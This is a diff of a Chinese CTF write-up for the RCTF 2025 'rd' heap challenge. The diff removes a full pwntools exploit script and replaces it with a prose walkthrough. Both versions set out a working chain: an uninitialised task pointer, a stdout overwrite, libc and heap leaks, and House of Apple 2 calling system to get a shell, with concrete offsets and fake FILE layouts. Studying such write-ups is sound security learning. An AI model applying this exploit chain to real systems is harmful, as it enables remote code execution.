@@ -2,504 +2,103 @@
 
 ## 题目简述
 
-服务在 task 数量达到阈值后不会初始化 `tasks` 指针，可通过堆布局踩到 stdout 指针。解法分两轮 IO：第一轮泄露 heap/libc，第二轮构造 fake stdout / fake IO FILE 控制执行流。
+题目是一个以空行分隔、字段格式为 `key:value` 的多用户任务服务，支持 `register`、`login`、`deregister` 和 `submit_task`。任务由后台线程异步处理，内容在写入结果前会按字节异或 `0x3f`。
+
+程序同时存在三类生命周期错误：注销只释放 user 结构体而不清理其成员；全局 task 数达到上限后，`allocate_task` 直接返回却不把新 user 的 `tasks` 置空；后台 `do_task/task_log` 又会在较长时间后继续使用 task。官方预期利用共享 task 的竞态和 UAF，总 PDF 则用堆布局直接控制未初始化的 `tasks` 指针，分两轮伪造 `stdout` 完成泄露与 House of Apple 2。
 
 ## 解题过程
 
-### 关键观察
+### 1. 还原未初始化 task 指针
 
-服务在 task 数量达到阈值后不会初始化 `tasks` 指针，可通过堆布局踩到 stdout 指针。
+反编译得到的分配逻辑为：
 
-### 求解步骤
-
-不打race，在 task 大于等于 17 ，不初始化 tasks，利用风水踩 stdout 指针，run task 的之后就能
-在 stdout 写堆地址。
-打两遍 IO，第一次 leak heap_base，第二次控制执行流
-依然奇妙原因，不race远程依然有成功率，成功率还蛮低的:)
-void __cdecl allocate_task(user_t *user)
-{
-  task_t *task; // [rsp+18h] [rbp-8h]
-
-  if ( task_allocated <= 15 )
-  {
-    task = (task_t *)malloc(0x28u);
-    task->result = 0;
-    task->task_length = 0;
-    task->user_running = &user->task_running;
-    ++task_allocated;
-    user->tasks = task;
-  }
-}
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-from pwn import *
-import re
-
-BIN  = './main'
-HOST = '<challenge-host>'
-PORT = 26002
-
-BROKEN_TIMES = 150
-
-# HOST = '127.0.0.1'
-# PORT = 13331
-
-context.binary = BIN
-# context.gdb_binary = 'pwndbg'
-context.log_level = 'debug' # if args.DEBUG else 'info'
-context.terminal = ['tmux', 'splitw', '-h']
-
-def task_sleep():
-    sleep(4)
-
-def start():
-    if args.REMOTE:
-        return remote(HOST, PORT)
-    elif args.GDB:
-        io = process(BIN)
-        gdb.attach(io, gdbscript='''
-            dir ~/glibc/glibc-2.39
-            source ~/tools/Pwngdb/pwngdb.py
-            source ~/tools/Pwngdb/angelheap/gdbinit.py
-            define hook-run
-            python
-            import angelheap
-            angelheap.init_angelheap()
-            end
-            end
-            set debuginfod enabled on
-
-            b *main
-            c
-        ''')
-        return io
-    else:
-        io = process(BIN)
-        return io
-
-io = start()
-
-# recv
-r   = lambda n=4096:           io.recv(n)
-rl  = lambda:                  io.recvline()
-ru  = lambda x, drop=True:     io.recvuntil(x, drop=drop)
-
-rnb = lambda n=4096, t=0.1:    io.recv(n, timeout=t)
-cln = lambda t=0.1:            io.clean(timeout=t)
-
-# send
-s   = lambda data:             io.send(data)
-sl  = lambda data:             io.sendline(data)
-sa  = lambda delim, data:      io.sendafter(delim, data)
-sla = lambda delim, data:      io.sendlineafter(delim, data)
-
-def make_packet(fields: dict) -> bytes:
-    lines = []
-    for k, v in fields.items():
-        lines.append(f"{k}:".encode() + v)
-    pkt = b"\n".join(lines) + b"\n"
-    return pkt
-
-def send_packet(fields: dict, show=True, t=1) -> bytes:
-    pkt = make_packet(fields)
-    sleep(0.5)
-    sl(pkt)
-    # resp = rnb(4096, t=t)
-    # if show and resp:
-    #     log.info(f"resp: {resp!r}")
-    # return resp or b''
-
-IO_FILE_STRUCT = {
-    'amd64': {
-        0x0: '_flags',
-        0x8: '_IO_read_ptr',
-        0x10: '_IO_read_end',
-        0x18: '_IO_read_base',
-        0x20: '_IO_write_base',
-        0x28: '_IO_write_ptr',
-        0x30: '_IO_write_end',
-        0x38: '_IO_buf_base',
-        0x40: '_IO_buf_end',
-        0x48: '_IO_save_base',
-        0x50: '_IO_backup_base',
-        0x58: '_IO_save_end',
-        0x60: '_markers',
-        0x68: '_chain',
-        0x70: '_fileno',
-        0x74: '_flags2',
-        0x78: '_old_offset',
-        0x80: '_cur_column',
-        0x82: '_vtable_offset',
-        0x83: '_shortbuf',
-        0x88: '_lock',
-        0x90: '_offset',
-        0x98: '_codecvt',
-        0xa0: '_wide_data',
-        0xa8: '_freeres_list',
-        0xb0: '_freeres_buf',
-        0xb8: '__pad5',
-        0xc0: '_mode',
-        0xc4: '_unused2',
-        0xd8: 'vtable'
+```c
+void allocate_task(user_t *user) {
+    task_t *task;
+    if (task_allocated <= 15) {
+        task = malloc(0x28);
+        task->result = 0;
+        task->task_length = 0;
+        task->user_running = &user->task_running;
+        ++task_allocated;
+        user->tasks = task;
     }
 }
+```
 
-def build_fake_io_file(arch='amd64', **kwargs):
-    struct_def = IO_FILE_STRUCT.get(arch)
-    if not struct_def:
-        raise ValueError(f"Unsupported architecture: {arch}")
+前 16 次会初始化 `user->tasks`；从第 17 个 user 起，函数什么也不做。如果该 user 结构体复用了先前释放或由协议解析器填充的同尺寸堆块，`tasks` 就保留旧内容，后续提交/运行任务会把它当作真实 `task_t *`。
 
-    fake_io = b'\x00' * 0xe0
+注销路径只 `free(user)`，没有释放或断开已有 task；因此官方路线可让新旧 user 共享 task。后台线程在 `task_log` 中停留较久，主线程可在它睡眠期间注销、重分配并改写原对象，形成异步 UAF 和堆溢出。
 
-    defaults = {
-        '_flags': 0xfbad1800,
-        '_IO_write_base': 0,
-        '_IO_write_ptr': 0,
-        '_IO_write_end': 0,
-        '_IO_buf_base': 0,
-        '_IO_buf_end': 0,
-        'vtable': 0,
-        '_fileno': 1,
-    }
+### 2. 官方预期：竞态建立堆读写
 
-    defaults.update(kwargs)
+题目目录的单题 WP 按三阶段利用竞态：
 
-    for offset, field_name in struct_def.items():
-        if field_name in defaults:
-            value = defaults[field_name]
-            if isinstance(value, int):
-                if offset in [0x70, 0x74, 0x80, 0x82, 0x83, 0xc0, 0xc4]:  # 小
-字段
-                    if offset == 0x70:
-                        fake_io = fake_io[:offset] + p32(value & 0xffffffff) +
-fake_io[offset+4:]
-                    elif offset == 0x74:
-                        fake_io = fake_io[:offset] + p32(value & 0xffffffff) +
-fake_io[offset+4:]
-                    elif offset == 0x80:
-                        fake_io = fake_io[:offset] + p16(value & 0xffff) +
-fake_io[offset+2:]
-                    elif offset == 0x82:
-                        fake_io = fake_io[:offset] + p8(value & 0xff) +
-fake_io[offset+1:]
-                    elif offset == 0x83:
-                        fake_io = fake_io[:offset] + p8(value & 0xff) +
-fake_io[offset+1:]
-                    elif offset == 0xc0:
-                        fake_io = fake_io[:offset] + p32(value & 0xffffffff) +
-fake_io[offset+4:]
-                    elif offset == 0xc4:
-                        fake_io = fake_io[:offset] + p32(value & 0xffffffff) +
-fake_io[offset+4:]
-                else:
-                    fake_io = fake_io[:offset] + p64(value) +
-fake_io[offset+8:]
+1. 注册 16 个用户耗尽正常 task 分配；取得若干 token，并提交不同大小的异步任务。
+2. 在任务仍运行时注销其 user，再注册同尺寸新 user 复用堆块。后台线程醒来后把异或还原的长结果写进已被复用的对象，覆盖相邻 user 的 token 或指针。
+3. 第一轮覆盖令登录响应泄露 safe-linking 值，左移 12 得到 heap base；第二轮把 victim 指针改到堆内 unsorted-bin 元数据，泄露 main_arena 并还原 libc；第三轮伪造 tcache next，把分配目标导向 `_IO_2_1_stdout_`，再布置 House of Apple 2。
 
-    return fake_io
+官方脚本在每轮提交后等待约 4.5 秒，以覆盖后台任务的延迟窗口。这个等待值不是漏洞条件，应以服务实际任务时长为准；更稳的实现应根据可观察响应推进阶段，无法观测时再使用有上下界的重试。
 
-def do_register(username: str, password: str) -> bytes:
-    fields = {
-        'command': b'register',
-        'username': username.encode(),
-        'password': password.encode(),
-    }
-    return send_packet(fields)
+### 3. 总 PDF：不打 race 的堆复用路线
 
-def do_login(username: str, password: str, parse_token: bool = True,
-broken_io: bool = False, second_login: bool = False):
-    fields = {
-        'command': b'login',
-        'username': username.encode(),
-        'password': password.encode(),
-    }
-    resp = send_packet(fields)
+总 PDF 先注册 16 个用户，再用三个用户提交约 `0xa00`、`0xa10`、`0xa20` 字节任务，制造大块和异步 worker 布局。随后发送缺少合法 `command` 的畸形字段包，让协议解析路径分别释放或保留特定大小的临时块。
 
-    # if broken_io:
-    #     for i in range(BROKEN_TIMES):
-    #         _fileds = {
-    #             'command': b'register',
-    #             'username': b'user1',
-    #             'password': b'pass1',
-    #         }
-    #         send_packet(_fileds)
-    #         log.info(f"send {i} packets")
-    #         sleep(0.01)
-        # for i in range(BROKEN_TIMES - 1):
-        #     ru('user_token:')
+第 17 个 user 不再获得新 task。通过上述堆风水，让它复用攻击者填充过的 user 块，就可把残留 `tasks` 设置为 `stdout - 0x20`。后续 `submit_task` 对“task 结果”的写入实际落入 libc 的标准流对象附近。虽然没有利用两个线程同时改同一 task，后台任务仍是异步的，所以远程脚本仍需在关键提交后等待，成功率也会受堆分配与调度影响。
 
-    ru('user_token:')
-    token = ru('\n', drop=True)
-    print(f"token: {token!r}")
-    return resp, token
+### 4. 先泄露 libc，再伪造 stdout 泄露 heap
 
-def do_submit_task(token: bytes | str, task_content: bytes | str) -> bytes:
-    if isinstance(token, str):
-        token = token.encode()
-    if isinstance(task_content, str):
-        task_content = task_content.encode()
+登录 token 的输出长度处理不严，堆布局合适时会把 token 后方的 unsorted-bin 指针一并打印。PDF exploit 从 `token[32:]` 取泄露，并使用附件 glibc 2.39 的偏移：
 
-    fields = {
-        'command':    b'submit_task',
-        'user_token': token,
-        'task_content': task_content
-    }
-    return send_packet(fields)
+```text
+libc_base = leak - 0x203b20
+stdout    = libc_base + 0x2046a8
+```
 
-def do_deregister(token: bytes | str) -> bytes:
-    if isinstance(token, bytes):
-        token = token.decode()
+将未初始化 `tasks` 指到 `stdout - 0x20` 后，提交的 task 内容会异或 `0x3f`，所以发送前必须把目标 `_IO_FILE` 每字节再异或一次。第一份 fake stdout 设置：
 
-    fields = {
-        'command':    b'deregister',
-        'user_token': token.encode(),
-    }
-    return send_packet(fields)
+- `_flags = 0xfbad1802`，文件描述符为 1；
+- `_IO_write_base` 指向 libc 中保存 heap 指针的全局位置；
+- `_IO_write_ptr = _IO_write_end = base + 8`；
+- `_lock` 和 vtable 指向该 libc 版本中的合法可读写对象。
 
-def exploit():
-    for i in range(16):
-        reg_resp = do_register(f'user{i}', f'pass{i}')
-        ru(f'Reigster success')
+下一次正常登录触发 stdout 输出时，会把 `[write_base, write_ptr)` 的 8 字节当作待输出数据，得到 heap address。这样第一轮 FILE 伪造只负责读，不承担控制流劫持，便于检查泄露是否正确。
 
-    login_resp, token = do_login('user1', 'pass1')
-    submit_resp = do_submit_task(token, 'A' * 0xa00)
-    if args.REMOTE :
-        task_sleep()
+### 5. 第二轮 House of Apple 2
 
-    login_resp, token = do_login('user2', 'pass2')
-    submit_resp = do_submit_task(token, 'B' * 0xa10)
-    if args.REMOTE :
-        task_sleep()
-    login_resp, token = do_login('user3', 'pass3')
-    submit_resp = do_submit_task(token, 'C' * 0xa20)
-    if args.REMOTE :
-        task_sleep()
-    '''
-    brva 0x16CD
-    '''
+取得 heap 后，重复一次堆复用，把另一名未初始化 user 的 `tasks` 再次指向 `stdout - 0x20`。在已知堆地址布置 fake `_IO_FILE`、fake `_IO_wide_data` 和 fake wide vtable：
 
-    fields = {
-        # By this we free the chunk
-        'command': b'login',
-        'fuck': b'E' * 0x428,
-    }
-    send_packet(fields)
+- FILE 开头放可被 `system` 解释的命令字符串，PDF 使用等价于 `"  sh;"` 的 `_flags` 字节；
+- `_IO_write_ptr > _IO_write_base`，使下一次输出进入 overflow 路径；
+- `_wide_data` 指向堆上的伪造 wide-data；
+- vtable 使用合法的 `_IO_wfile_jumps`，绕过 vtable 合法性检查；
+- fake wide vtable 的调用槽填入 `system`。
 
-    if args.REMOTE:
-        sleep(1)
+附件环境对应的主要偏移为：
 
-    fields = {
-        # By this we dont free the chunk
-        'loveyou': b'B' * (0x410 - 0xd0),
-    }
-    send_packet(fields)
-    ru('Invalid')
+```text
+system          = libc_base + 0x58750
+_IO_wfile_jumps = libc_base + 0x202228
+```
 
-    reg_resp = do_register('U' * 8, 'P' * 8)
-    ru('success')
-    login_resp, token = do_login('U' * 8, 'P' * 8)
-    libc_leak = u64(token[32:].ljust(8, b'\x00'))
-    log.info(f"libc_leak: {hex(libc_leak)}")
+触发一次正常输出后，wide FILE 路径最终以 fake FILE 地址为参数调用 `system`，FILE 起始字节即 shell 命令，由此获得 shell。总 PDF 最后一页的终端截图显示成功执行 `cat flag.txt`，flag 为：
 
-    libc_base = libc_leak - 0x203b20
-    log.info(f"libc_base: {hex(libc_base)}")
-    stdout = libc_base + 0x2046a8
-    log.info(f"stdout: {hex(stdout)}")
+```text
+RCTF{y0u_4re_master_0f_r4ce_condition}
+```
 
-    # Clean the unsorted bin
-    fields = {
-        # By this we dont free the chunk
-        'loveyou': b'B' * 0x330,
-    }
-    send_packet(fields)
-    ru('Invalid')
+### 6. 稳定性与调试边界
 
-    # Fake task
-    fields = {
-        # By this we free the chunk
-        'command': b'login',
-        'fuck': b'!' * 0x430 + p64(stdout - 0x20)[:6] + b'A', # To delete the
-zero
-    }
-    send_packet(fields)
-    if args.REMOTE:
-        sleep(1)
+PDF 脚本区分本地和远端的 fake FILE 堆偏移，例如 `heap_base + 0x6240` 与 `heap_base + 0x5e30`，说明其布局并不通用。稳定复现应做到：
 
-    fields = {
-        # By this we free the chunk
-        'command': b'login',
-        'fuck': b'!' * 0x430 + p64(stdout - 0x20)[:6],
-    }
-    send_packet(fields)
-
-    if args.REMOTE:
-        sleep(1)
-
-    reg_resp = do_register('loveme'.ljust(0x1c0 + 0x60 - 0x30, 'e'), 'P' *
-(0x200))
-    ru('success')
-    login_resp, token = do_login('loveme'.ljust(0x1c0 + 0x60 - 0x30, 'e'), 'P'
-* (0x200))
-
-    _io_wfile_table = 0x202228 + libc_base
-    demangle_key = 0x259740 + 0x30 + libc_base
-    heap_base_addr_libc = 0x2031e0 + libc_base
-
-    fake_stdout = build_fake_io_file(
-        arch='amd64',
-        _flags = 0xfbad1800 | 0x0002,
-        _IO_read_ptr = libc_base ,
-        _IO_read_end = libc_base,
-        _IO_read_base = libc_base,
-        _IO_write_base = heap_base_addr_libc,
-        _IO_write_ptr = heap_base_addr_libc + 8,
-        _IO_write_end = heap_base_addr_libc + 8,
-        _IO_buf_base = 0,
-        _IO_buf_end = heap_base_addr_libc + 0x10,
-        _IO_save_base = 0,
-        _IO_backup_base = 0,
-        _IO_save_end = 0,
-        _markers = 0,
-        _chain = 0,
-        _fileno = 1,
-        _flags2 = 128,
-        # _old_offset = -1,
-        _cur_column = 0,
-        _vtable_offset = 0,
-        _lock = 0x205700 + libc_base  ,
-        # _offset = -1,
-        _codecvt = 0,
-        _wide_data = 0,
-        _freeres_list = 0,
-        _freeres_buf = 0,
-        vtable = 0x202030 + libc_base,
-        # _mode = -1,
-    )
-
-    # xor with 0x3f
-    fake_stdout = xor(fake_stdout, 0x3f)
-
-    log.info(f"fake_stdout size: {len(fake_stdout)}")
-    log.info(f"fake_stdout hex: {fake_stdout.hex()[:100]}...")
-
-    submit_resp = do_submit_task(token, fake_stdout)
-    # input("leak >")
-
-    _fileds = {
-        'command': b'login',
-        'username' : b'user1',
-        'password' : b'pass1'
-    }
-    send_packet(_fileds)
-    heap_base_addr = u64(ru('\n')[:6].ljust(8, b'\x00'))
-    log.info(f"heap_base_addr: {hex(heap_base_addr)}")
-
-    # for i in range(100):
-    #     sl('\n' * 0xf00)
-    #     sleep(0.1)
-    # ru('packet')
-    # io.interactive()
-    login_resp, token = do_login('user4', 'pass4', broken_io=True)
-    submit_resp = do_submit_task(token, 'D' * 0xa30)
-    if args.REMOTE and HOST != '127.0.0.1':
-        task_sleep()
-    # Fake task
-
-    fields = {
-        # By this we free the chunk
-        'command': b'login',
-        'fuck': b'!' * 0x430 + p64(stdout - 0x20)[:6] + b'A', # To delete the
-zero
-    }
-    send_packet(fields)
-    # ru('Invalid')
-    if args.REMOTE:
-        sleep(1)
-
-    fields = {
-        # By this we free the chunk
-        'command': b'login',
-        'fuck': b'!' * 0x430 + p64(stdout - 0x20)[:6],
-    }
-    send_packet(fields)
-    if args.REMOTE:
-        sleep(1)
-
-    if not args.REMOTE:
-        reg_resp = do_register('xxx'.ljust(0x210 + 0x100 + 0xa0 + 0x60 - 0x30,
-'e'), 'P' * (0x28))
-    else:
-        reg_resp = do_register('xxx'.ljust(0x210 + 0x100 + 0xa0 + 0x60 - 0x30,
-'e'), 'P' * (0x28))
-
-
-    print(io.recv())
-
-    if not args.REMOTE:
-        login_resp, token_2 = do_login('xxx'.ljust(0x210 + 0x100 + 0xa0 + 0x60
-- 0x30, 'e'), 'P' * (0x28), broken_io=True)
-    else:
-        login_resp, token_2 = do_login('xxx'.ljust(0x210 + 0x100 + 0xa0 + 0x60
-- 0x30, 'e'), 'P' * (0x28), broken_io=True)
-
-    if not args.REMOTE:
-        heap_after_file = 0x6240 + heap_base_addr
-    else:
-        heap_after_file = 0x5e30 + heap_base_addr
-
-    fake_stdout = build_fake_io_file(
-        arch='amd64',
-        _flags=0x3b68732020,
-        _IO_write_base=0,
-        _IO_write_ptr=0x4141414141414141,
-        _IO_write_end=0,
-        _IO_read_ptr=0,
-        _IO_read_end=1,
-        _IO_read_base=0,
-        _IO_buf_base=0,
-        _IO_buf_end=0,
-        _lock=stdout + 0x100,
-        _wide_data=heap_after_file,
-        # _codecvt = 0x5cb0 + heap_base_addr,
-        vtable=_io_wfile_table,
-    )
-
-    fake_stdout += flat(
-        {
-            0: b'HIROHIRO',
-            0x68: 0x58750 + libc_base,
-            0xe0: heap_after_file
-        },filler=b'\x00'
-    )
-
-    fake_stdout = xor(fake_stdout, 0x3f)
-
-    log.info(f"fake_stdout size: {len(fake_stdout)}")
-    log.info(f"fake_stdout hex: {fake_stdout.hex()[:100]}...")
-
-
-    log.info(f"token_2: {token_2!r}")
-
-    submit_resp = do_submit_task(token_2, fake_stdout)
-    if args.REMOTE:
-        task_sleep()
-
-    reg_resp = do_register('H', 'E')
-
-    io.interactive()
-
-def main():
-    exploit()
-
-if __name__ == '__main__':
-    main()
-
-### PDF 图片
-
-![rd 调试终端中的寄存器和内存状态](RCTF2025-rd-wp/rd-debug-terminal-output.png)
+1. 每个阶段独立验证泄露是否落在 heap/libc 合法区间；失败立即重连，不带错误基址继续写。
+2. 把“耗尽 task”“制造 unsorted chunk”“控制第 17 个 user”“第一轮 stdout 泄露”“第二轮 stdout 劫持”分成可重试阶段。
+3. 使用随题 glibc 2.39 重新确认 `_IO_FILE`、`_IO_wide_data`、`_IO_wfile_jumps` 和 `system` 偏移。
+4. task 内容落地前会异或 `0x3f`，所有 fake FILE 字节必须预编码；协议字段本身不应误做相同变换。
 
 ## 方法总结
 
-- 核心技巧：未初始化任务指针 + fake IO FILE。
-- 识别信号：计数达到阈值后分配逻辑跳过初始化，但后续仍使用 task 指针。
-- 复用要点：远程成功率低时把 exploit 拆成 leak 和 hijack 两轮，提高可调试性。
+- 根因是 user、task 与后台 worker 的生命周期不一致：成员未清理、配额失败未初始化、异步线程继续使用旧对象。
+- 官方预期利用竞态/UAF 逐步得到 heap、libc 和 tcache poisoning；总 PDF 通过堆复用直接控制未初始化 task 指针，省去显式竞态但仍受异步时序影响。
+- 两轮 FILE 伪造职责不同：第一轮把 stdout 变成定长任意读以泄露 heap，第二轮才用 House of Apple 2 调用 `system`。
+- 远程低成功率不是“多跑几次即可”的结论；应检查每次泄露、对象地址和 FILE 字段，再决定重试，避免把错误状态推进到不可恢复阶段。
